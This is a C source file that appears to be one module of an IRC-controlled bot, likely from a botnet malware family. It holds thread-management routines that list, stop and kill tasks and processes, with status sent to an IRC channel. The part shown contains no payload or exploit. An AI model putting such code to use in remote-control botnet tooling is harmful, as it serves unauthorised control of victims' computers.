/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
*/     


#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

// function to add description to thread list and return thread number
int addthread(char *name, int id, SOCKET sock)
{
	int i;
	for (i = 0; i < MAXTHREADS; i++) {
		if (threads[i].name[0] == '\0') {
			strncpy(threads[i].name, name, sizeof(threads[i].name)-1);
			threads[i].id=id;
			threads[i].parent=0;
			threads[i].pid=0;
			threads[i].sock=sock;
			threads[i].nick[0]='\0';
			break;
		}
	}
	return i;
}

DWORD WINAPI ListThread(LPVOID param) 
{
	TLIST tlist = *((TLIST *)param);
	TLIST *tlistp = (TLIST *)param;
	tlistp->gotinfo = TRUE;

	listthreads(tlist.sock,tlist.chan,tlist.notice,tlist.full);
		
	clearthread(tlist.threadnum);

	ExitThread(0);
}

void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "-[Thread List]-", notice);
	for (int i = 0; i < MAXTHREADS; i++) {
		if (threads[i].name[0] != '\0' && (full || threads[i].parent == 0)) {
			sprintf(buffer, "%d. %s", i, threads[i].name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
	}

	return;
}

BOOL killthread(int threadnum)
{
	BOOL threadkilled = FALSE;
				
	if ((threadnum>0) && (threadnum<MAXTHREADS)) {
		TerminateThread(threads[threadnum].tHandle, 0);
		if (threads[threadnum].tHandle != 0) 
			threadkilled = TRUE;

		threads[threadnum].tHandle = 0;
		threads[threadnum].id = 0;
		threads[threadnum].parent = 0;

		if(threads[threadnum].pid > 0)
			killProcess(threads[threadnum].pid);
		threads[threadnum].pid = 0; 
		
		threads[threadnum].name[0] = '\0';
		threads[threadnum].nick[0] = '\0';

		fclosesocket(threads[threadnum].sock);
		threads[threadnum].sock = 0;
		fclosesocket(threads[threadnum].csock);
		threads[threadnum].csock = 0;
	}

	return (threadkilled);
}

int killthreadall(void)
{
	int numthreads=0;

	for (int i = 0; i < MAXTHREADS; i++)
		if (threads[i].name[0] != '\0')
			if (killthread(i))
				numthreads++;

	return (numthreads);
}

int killthreadid(int threadid, int threadnum)
{
	int numthreads=0;

	for (int i=0;i<MAXTHREADS;i++) {
		if (threads[i].id == threadid) {
			if (threadnum > 0) {
				if (threads[i].parent == threadnum || i == threadnum)
					if (killthread(i)) 
						numthreads++;
			} else {
				if (killthread(i)) 
					numthreads++;
			}
		}
	}

	return (numthreads);
}

int findthreadid(int threadid)
{
	int numthreads=0;

	for (int i=0;i<MAXTHREADS;i++)
		if (threads[i].id == threadid)
			numthreads++;

	return (numthreads);
}

int findthreadnum(int threadid)
{
	int threadnum=0;

	for (int i=0;i<MAXTHREADS;i++)
		if (threads[i].id == threadid) {
			threadnum=i;
			break;
		}

	return (threadnum);
}

void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread)
{
	char sendbuf[IRCLINE];
	int threadnum=0, i;

	if(thread)
		threadnum=atoi(thread);

	if ((i=killthreadid(threadid,threadnum)) > 0)
		sprintf(sendbuf,"%s: %s stopped. (%d thread(s) stopped.)", name, desc, i);
	else
		sprintf(sendbuf,"%s: No %s thread found.", name, desc);
	if (!silent) irc_privmsg(sock,chan,sendbuf,notice);
	addlog(sendbuf);

	return;
}

void clearthread(int threadnum)
{
	threads[threadnum].tHandle = 0;
	threads[threadnum].id=0;
	threads[threadnum].parent=0;
	threads[threadnum].pid=0;
	threads[threadnum].sock=0;
	threads[threadnum].csock=0;
	threads[threadnum].name[0]='\0';
	threads[threadnum].nick[0]='\0';

	return;
}